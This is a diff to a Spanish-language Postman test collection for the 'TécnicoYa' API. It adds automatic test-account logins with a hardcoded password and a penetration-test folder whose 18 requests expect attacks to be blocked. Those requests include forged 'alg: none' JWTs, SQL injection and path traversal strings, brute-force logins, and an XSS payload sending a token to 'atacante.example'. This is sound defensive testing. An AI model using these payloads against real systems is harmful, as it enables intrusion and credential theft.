@@ -2,7 +2,7 @@
   "info": {
     "_postman_id": "181da699-b03f-4bed-9111-85d9402cb6bf",
     "name": "TécnicoYa API",
-    "description": "Pruebas de los 60 endpoints de la API de TécnicoYa: inicio de sesión, 11 recursos × GET, GET/{id}, POST, PUT/{id}, DELETE/{id} y 4 reportes Excel (solo administrador).\n\nRequisitos: la API corriendo en http://localhost:8080 y la BD cargada con database/schema.sql y database/data.sql.\n\nAutenticación: \"00 - Autenticación > Iniciar sesión\" guarda el token JWT en la variable {{token}}, que la colección envía en la cabecera Authorization: Bearer de todas las peticiones. Si ejecuta una carpeta suelta, inicie sesión primero (el token dura 8 horas).\n\nUso: ejecute la colección completa con el Collection Runner, o cada carpeta en orden.\nCada POST guarda el id creado en una variable de colección que usan los GET, PUT y DELETE siguientes.\nTodo lo que se crea se elimina al final de su carpeta, así que los datos de ejemplo no cambian.\nLas peticiones marcadas [Error] verifican las validaciones y reglas de negocio.",
+    "description": "Pruebas de los 60 endpoints de la API de TécnicoYa: inicio de sesión, 11 recursos × GET, GET/{id}, POST, PUT/{id}, DELETE/{id} y 4 reportes Excel (solo administrador).\n\nRequisitos: la API corriendo en http://localhost:8080 y la BD cargada con database/schema.sql y database/data.sql.\n\nAutenticación: la colección inicia sesión automáticamente (script de colección) cuando falta un token o ya venció: como ADMINISTRADOR ({{token}}, el que usan por defecto las carpetas 01 a 13), como CLIENTE ({{tokenCliente}}) y como TECNICO ({{tokenTecnico}}). Por eso cualquier carpeta se puede ejecutar suelta. \"00 - Autenticación > Iniciar sesión\" prueba el login en sí.\nSeguridad: la carpeta 14 ejecuta 18 ataques (escalada de privilegios, IDOR, JWT falsificado, inyección SQL, XSS, path traversal, fuerza bruta) y verifica que todos sean bloqueados.\n\nUso: ejecute la colección completa con el Collection Runner, o cada carpeta en orden.\nCada POST guarda el id creado en una variable de colección que usan los GET, PUT y DELETE siguientes.\nTodo lo que se crea se elimina al final de su carpeta, así que los datos de ejemplo no cambian.\nLas peticiones marcadas [Error] verifican las validaciones y reglas de negocio.",
     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
   "event": [
@@ -14,7 +14,40 @@
           "// Fecha y hora dentro de 7 días (formato LocalDateTime) para fechaServicio",
           "const d = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);",
           "const dos = (n) => String(n).padStart(2, '0');",
-          "pm.collectionVariables.set('fechaFutura', `${d.getFullYear()}-${dos(d.getMonth() + 1)}-${dos(d.getDate())}T10:00:00`);"
+          "pm.collectionVariables.set('fechaFutura', `${d.getFullYear()}-${dos(d.getMonth() + 1)}-${dos(d.getDate())}T10:00:00`);",
+          "",
+          "// Inicio de sesión automático: si falta algún token o ya vencieron, la colección inicia sesión sola",
+          "// antes de enviar la petición. Así cualquier carpeta se puede ejecutar suelta, también a través de",
+          "// un proxy como OWASP ZAP.",
+          "//   token        -> ADMINISTRADOR (Carlos Mendoza): lo usan por defecto las carpetas 01 a 13",
+          "//   tokenCliente -> CLIENTE (María Quispe, usuario 2)",
+          "//   tokenTecnico -> TECNICO (Pedro Ramírez, usuario 5, técnico 1)",
+          "const SESIONES = [",
+          "    { variable: 'token', correo: 'carlos.mendoza@tecnicoya.example' },",
+          "    { variable: 'tokenCliente', correo: 'maria.quispe@correo.example' },",
+          "    { variable: 'tokenTecnico', correo: 'pedro.ramirez@tecnicoya.example' }",
+          "];",
+          "const esLogin = pm.request.url.getPath().endsWith('/auth/login');",
+          "const vence = Number(pm.collectionVariables.get('tokenVence') || 0);",
+          "const falta = SESIONES.some((s) => !pm.collectionVariables.get(s.variable));",
+          "if (!esLogin && (falta || Date.now() > vence)) {",
+          "    for (const sesion of SESIONES) {",
+          "        pm.sendRequest({",
+          "            url: pm.variables.replaceIn('{{baseUrl}}') + '/auth/login',",
+          "            method: 'POST',",
+          "            header: [{ key: 'Content-Type', value: 'application/json' }],",
+          "            body: { mode: 'raw', raw: JSON.stringify({ correo: sesion.correo, contrasena: 'TecnicoYa2026!' }) }",
+          "        }, (error, respuesta) => {",
+          "            if (error || respuesta.code !== 200) {",
+          "                console.error('No se pudo iniciar sesión como ' + sesion.correo + ':', error || respuesta.code);",
+          "                return;",
+          "            }",
+          "            pm.collectionVariables.set(sesion.variable, respuesta.json().token);",
+          "        });",
+          "    }",
+          "    // El token dura 8 horas; se renueva a las 7 por seguridad",
+          "    pm.collectionVariables.set('tokenVence', String(Date.now() + 7 * 60 * 60 * 1000));",
+          "}"
         ]
       }
     }
@@ -39,7 +72,19 @@
       "value": ""
     },
     {
+      "key": "tokenVence",
+      "value": ""
+    },
+    {
       "key": "tokenAdmin",
+      "value": ""
+    },
+    {
+      "key": "tokenTecnico",
+      "value": ""
+    },
+    {
+      "key": "tokenCliente",
       "value": ""
     },
     {
@@ -122,8 +167,8 @@
                   "pm.test('usuario.idUsuario = 2', () => pm.expect(json.usuario.idUsuario).to.eql(2));",
                   "pm.test('usuario.tipoUsuario = CLIENTE', () => pm.expect(json.usuario.tipoUsuario).to.eql(\"CLIENTE\"));",
                   "pm.test('No expone la contraseña', () => pm.expect(json.usuario).to.not.have.property('contrasena'));",
-                  "// Las demás peticiones envían este token en la cabecera Authorization: Bearer",
-                  "pm.collectionVariables.set('token', json.token);"
+                  "// Token de la CLIENTE; lo usan las pruebas de permisos (carpetas 13 y 14)",
+                  "pm.collectionVariables.set('tokenCliente', json.token);"
                 ]
               }
             }
@@ -3153,7 +3198,7 @@
     },
     {
       "name": "13 - Reportes Excel",
-      "description": "Reportes .xlsx generados con Apache POI. Solo los descarga un ADMINISTRADOR (anotación @RequiereRol): la carpeta inicia sesión como administrador y guarda su token en {{tokenAdmin}}. El token por defecto de la colección es de un CLIENTE, que recibe 403.",
+      "description": "Reportes .xlsx generados con Apache POI. Solo los descarga un ADMINISTRADOR (anotación @RequiereRol). La carpeta inicia sesión como administrador y guarda su token en {{tokenAdmin}}; la última petición usa el token de la CLIENTE ({{tokenCliente}}), que recibe 403.",
       "item": [
         {
           "name": "(Preparación) Iniciar sesión como administrador",
@@ -3327,7 +3372,685 @@
           "request": {
             "method": "GET",
             "header": [],
-            "url": "{{baseUrl}}/reportes/general"
+            "url": "{{baseUrl}}/reportes/general",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "14 - Pruebas de penetración",
+      "description": "Ataques reales contra la API (OWASP Top 10) que deben ser BLOQUEADOS. Cada petición pasa si la defensa funciona: 403 (control de acceso por rol y por dueño del registro), 401 (token falsificado), 400 (inyección SQL, XSS, path traversal) o 429 (fuerza bruta). Usa los tokens de la cliente María ({{tokenCliente}}) y del técnico Pedro ({{tokenTecnico}}). Ninguna petición modifica datos.",
+      "item": [
+        {
+          "name": "P01 Registro anónimo como ADMINISTRADOR",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('No permite registrarse como ADMINISTRADOR', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/usuarios",
+            "description": "Escalada de privilegios (OWASP A01). El registro es público: un atacante intenta crearse una cuenta de administrador.",
+            "auth": {
+              "type": "noauth"
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"nombres\": \"Atacante\",\n  \"apellidos\": \"Externo\",\n  \"correo\": \"atacante.admin@correo.example\",\n  \"contrasena\": \"Hackeo2026\",\n  \"tipoUsuario\": \"ADMINISTRADOR\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P02 Cliente se asciende a ADMINISTRADOR",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('No permite cambiar su propio tipo de usuario', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/usuarios/2",
+            "description": "Escalada de privilegios: María edita su propia cuenta y cambia tipoUsuario a ADMINISTRADOR.",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"nombres\": \"María Fernanda\",\n  \"apellidos\": \"Quispe Huamán\",\n  \"correo\": \"maria.quispe@correo.example\",\n  \"telefono\": \"987200301\",\n  \"tipoUsuario\": \"ADMINISTRADOR\",\n  \"estado\": \"ACTIVO\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P03 Verificar que María sigue siendo CLIENTE",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 200 (es su propia cuenta)', () => pm.response.to.have.status(200));",
+                  "pm.test('Sigue siendo CLIENTE', () => pm.expect(pm.response.json().tipoUsuario).to.eql('CLIENTE'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "{{baseUrl}}/usuarios/2",
+            "description": "Comprueba que el ataque anterior no modificó nada (y que el dueño sí puede ver su cuenta).",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "P04 IDOR: cliente lee los datos de otro usuario",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('No expone datos de otro usuario', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "{{baseUrl}}/usuarios/3",
+            "description": "IDOR (Insecure Direct Object Reference): María cambia el id de la URL para ver el correo y teléfono de José.",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "P05 IDOR: cliente modifica los datos de otro usuario",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('No permite modificar la cuenta de otro usuario', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/usuarios/3",
+            "description": "IDOR: María intenta cambiar el correo de José para luego recuperar su cuenta.",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"nombres\": \"José Luis\",\n  \"apellidos\": \"Torres Vega\",\n  \"correo\": \"cuenta.robada@correo.example\",\n  \"telefono\": \"987300402\",\n  \"tipoUsuario\": \"CLIENTE\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P06 Cliente lista todos los usuarios",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('Solo el administrador lista usuarios', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "{{baseUrl}}/usuarios",
+            "description": "Exposición de datos: la lista completa (correos y teléfonos) es solo para el administrador.",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "P07 Cliente elimina a otro usuario",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('No permite eliminar usuarios', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "DELETE",
+            "header": [],
+            "url": "{{baseUrl}}/usuarios/3",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "P08 Cliente solicita un servicio a nombre de otro cliente",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('No permite crear servicios a nombre de otro', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/servicios",
+            "description": "IDOR en creación: María envía clienteId = 3 (José).",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"clienteId\": 3,\n  \"tecnicoId\": null,\n  \"titulo\": \"Servicio suplantado\",\n  \"descripcionProblema\": \"Creado por otro cliente\",\n  \"prioridad\": \"MEDIA\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P09 Cliente crea un plan de suscripción",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('Solo el administrador gestiona planes', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/planes-suscripcion",
+            "description": "Función administrativa (OWASP A01 - falta de control por rol).",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"nombrePlan\": \"Plan Hackeado\",\n  \"precioInicial\": 0,\n  \"limiteClientes\": 999,\n  \"precioPosterior\": 0,\n  \"descripcion\": \"Gratis para siempre\",\n  \"estado\": \"ACTIVO\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P10 Técnico modifica el perfil de otro técnico",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('No permite editar el perfil de otro técnico', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/tecnicos/2",
+            "description": "IDOR: Pedro (técnico 1) edita el perfil de Rosa (técnico 2).",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenTecnico}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"usuarioId\": 6,\n  \"especialidad\": \"Perfil saboteado\",\n  \"descripcion\": \"Modificado por la competencia\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P11 Técnico agrega disponibilidad a otro técnico",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('No permite gestionar la agenda de otro técnico', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/disponibilidades",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenTecnico}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"tecnicoId\": 2,\n  \"diaSemana\": \"DOMINGO\",\n  \"horaInicio\": \"03:00:00\",\n  \"horaFin\": \"04:00:00\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P12 Técnico activa una suscripción sin pagar",
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const hoy = new Date();",
+                  "const fin = new Date(hoy.getTime() + 30 * 24 * 60 * 60 * 1000);",
+                  "pm.variables.set('hoy', hoy.toISOString().slice(0, 10));",
+                  "pm.variables.set('enUnMes', fin.toISOString().slice(0, 10));"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 403 Forbidden', () => pm.response.to.have.status(403));",
+                  "pm.test('Solo el administrador activa suscripciones', () => pm.expect(pm.response.json().mensaje).to.match(/permiso/i));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/suscripciones",
+            "description": "Manipulación de lógica de negocio: el técnico envía estadoSuscripcion = ACTIVA para saltarse el pago.",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenTecnico}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"tecnicoId\": 1,\n  \"planId\": 1,\n  \"fechaInicio\": \"{{hoy}}\",\n  \"fechaFin\": \"{{enUnMes}}\",\n  \"estadoSuscripcion\": \"ACTIVA\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P13 Token falsificado (alg: none, rol ADMINISTRADOR)",
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const b64 = (o) => btoa(JSON.stringify(o)).replace(/=+$/, '').replace(/\\+/g, '-').replace(/\\//g, '_');",
+                  "const ahora = Math.floor(Date.now() / 1000);",
+                  "pm.variables.set('tokenFalso', b64({ alg: 'none', typ: 'JWT' }) + '.' + b64({ sub: '1', rol: 'ADMINISTRADOR', iat: ahora, exp: ahora + 3600 }) + '.');"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 401 Unauthorized', () => pm.response.to.have.status(401));",
+                  "pm.test('No descarga el reporte', () => pm.expect(pm.response.headers.get('Content-Type')).to.include('application/json'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "{{baseUrl}}/reportes/general",
+            "description": "Ataque a JWT: token sin firma que dice ser del administrador. El servidor exige la firma HMAC-SHA256.",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenFalso}}",
+                  "type": "string"
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "P14 Inyección SQL en el inicio de sesión",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('No inicia sesión (400 o 401)', () => pm.expect(pm.response.code).to.be.oneOf([400, 401]));",
+                  "pm.test('No devuelve un token', () => pm.expect(pm.response.json()).to.not.have.property('token'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/auth/login",
+            "description": "Clásico ' OR '1'='1: la API usa JPQL con parámetros (nunca concatena texto) y valida el formato del correo.",
+            "auth": {
+              "type": "noauth"
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"correo\": \"' OR '1'='1' -- \",\n  \"contrasena\": \"' OR '1'='1\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P15 Inyección SQL en un id de la URL",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 400', () => pm.response.to.have.status(400));",
+                  "pm.test('No filtra detalles internos', () => {",
+                  "    const texto = pm.response.text();",
+                  "    pm.expect(texto).to.not.match(/Exception|SQL|at com\\.|hibernate/i);",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "{{baseUrl}}/usuarios/1%20OR%201=1",
+            "description": "El id se convierte a Long antes de llegar a la base de datos: el texto extra se rechaza."
+          }
+        },
+        {
+          "name": "P16 Path traversal en la descarga de archivos",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('No responde 200', () => pm.expect(pm.response.code).to.be.oneOf([400, 404]));",
+                  "pm.test('No expone la configuración', () => pm.expect(pm.response.text()).to.not.include('spring.datasource'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "{{baseUrl}}/archivos/..%2F..%2Fsrc%2Fmain%2Fresources%2Fapplication.properties",
+            "description": "Intenta salir de la carpeta de archivos para leer la configuración (contraseña de la BD, secreto JWT).",
+            "auth": {
+              "type": "noauth"
+            }
+          }
+        },
+        {
+          "name": "P17 XSS almacenado en la solicitud de un servicio",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 400', () => pm.response.to.have.status(400));",
+                  "pm.test('Rechaza el HTML del título', () => pm.expect(pm.response.json().errores.titulo).to.include('HTML'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/servicios",
+            "description": "El atacante guarda un <script> que se ejecutaría en el navegador del técnico. @SinHtml lo rechaza.",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{tokenCliente}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"clienteId\": 2,\n  \"tecnicoId\": null,\n  \"titulo\": \"<img src=x onerror=alert(document.cookie)>\",\n  \"descripcionProblema\": \"<script>fetch(\\\"https://atacante.example/?c=\\\" + localStorage.token)</script>\",\n  \"prioridad\": \"MEDIA\"\n}"
+            }
+          }
+        },
+        {
+          "name": "P18 Fuerza bruta en el inicio de sesión",
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// 5 intentos fallidos seguidos para la misma cuenta (correo + IP)",
+                  "const intentar = (n) => {",
+                  "    if (n > 5) return;",
+                  "    pm.sendRequest({",
+                  "        url: pm.variables.replaceIn('{{baseUrl}}') + '/auth/login',",
+                  "        method: 'POST',",
+                  "        header: [{ key: 'Content-Type', value: 'application/json' }],",
+                  "        body: { mode: 'raw', raw: JSON.stringify({ correo: 'fuerza.bruta@correo.example', contrasena: 'Clave' + n + 'Erronea' }) }",
+                  "    }, (error, respuesta) => { console.log('Intento ' + n + ':', respuesta && respuesta.code); intentar(n + 1); });",
+                  "};",
+                  "intentar(1);"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('Responde 429 Too Many Requests', () => pm.response.to.have.status(429));",
+                  "pm.test('Indica cuánto esperar (Retry-After)', () => pm.expect(Number(pm.response.headers.get('Retry-After'))).to.be.above(0));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/auth/login",
+            "description": "El script previo prueba 5 contraseñas incorrectas; el sexto intento queda bloqueado 15 minutos (429).",
+            "auth": {
+              "type": "noauth"
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"correo\": \"fuerza.bruta@correo.example\",\n  \"contrasena\": \"Clave6Erronea\"\n}"
+            }
           }
         }
       ]
